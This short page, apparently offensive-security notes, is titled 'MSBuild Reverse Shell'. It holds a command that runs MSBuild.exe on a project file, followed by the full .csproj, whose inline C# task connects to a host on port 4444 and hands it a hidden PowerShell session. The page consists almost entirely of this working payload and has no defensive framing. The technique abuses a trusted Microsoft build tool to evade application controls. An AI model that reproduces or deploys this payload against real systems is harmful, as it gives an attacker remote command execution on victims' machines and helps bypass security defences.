# MSBuild Reverse Shell

```bash

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe .\a.csproj
```

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
    <MSBuildTest/>
  </Target>
   <UsingTask
    TaskName="MSBuildTest"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
            using System;
            using System.IO;
            using System.Net.Sockets;
            using System.Diagnostics;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class MSBuildTest : Task
            {
                public override bool Execute()
                {
                    string ipAddress = "localhost";
                    int port = 4444;

                    try
                    {
                        using (TcpClient client = new TcpClient(ipAddress, port))
                        {
                            using (NetworkStream stream = client.GetStream())
                            {
                                using (StreamReader reader = new StreamReader(stream))
                                {
                                    using (StreamWriter writer = new StreamWriter(stream) { AutoFlush = true })
                                    {
                                        // Inform the remote host of the connection
                                        writer.WriteLine("Connected to reverse shell");

                                        // Set up the process to execute PowerShell commands
                                        Process process = new Process();
                                        process.StartInfo.FileName = "powershell.exe";
                                        process.StartInfo.RedirectStandardInput = true;
                                        process.StartInfo.RedirectStandardOutput = true;
                                        process.StartInfo.RedirectStandardError = true;
                                        process.StartInfo.UseShellExecute = false;
                                        process.StartInfo.CreateNoWindow = true;

                                        // Start the PowerShell process
                                        process.Start();

                                        // Attach event handlers for standard output and error
                                        process.OutputDataReceived += (sender, args) =>
                                        {
                                            if (args.Data != null)
                                            {
                                                writer.WriteLine(args.Data);
                                                writer.Flush();
                                            }
                                        };
                                        process.ErrorDataReceived += (sender, args) =>
                                        {
                                            if (args.Data != null)
                                            {
                                                writer.WriteLine(args.Data);
                                                writer.Flush();
                                            }
                                        };

                                        process.BeginOutputReadLine();
                                        process.BeginErrorReadLine();

                                        // Function to send the prompt
                                        Action sendPrompt = () =>
                                        {
                                            writer.Write("PS > ");
                                            writer.Flush();
                                        };

                                        // Send the initial prompt
                                        sendPrompt();

                                        while (true)
                                        {
                                            // Read the next command from the remote user
                                            string command = reader.ReadLine();
                                            if (command == null) break;

                                            // Write the command to PowerShell's standard input
                                            process.StandardInput.WriteLine(command);
                                            process.StandardInput.Flush();

                                            // Short delay to allow the command to execute and send back output
                                            System.Threading.Thread.Sleep(100);

                                            // Send the prompt again after executing the command
                                            sendPrompt();
                                        }

                                        // Close the PowerShell process
                                        process.StandardInput.Close();
                                        process.WaitForExit();
                                    }
                                }
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("Reverse shell error: " + ex.Message);
                    }

                    return true;
                }
            }
        ]]>
      </Code>
    </Task>

  </UsingTask>
</Project>
```
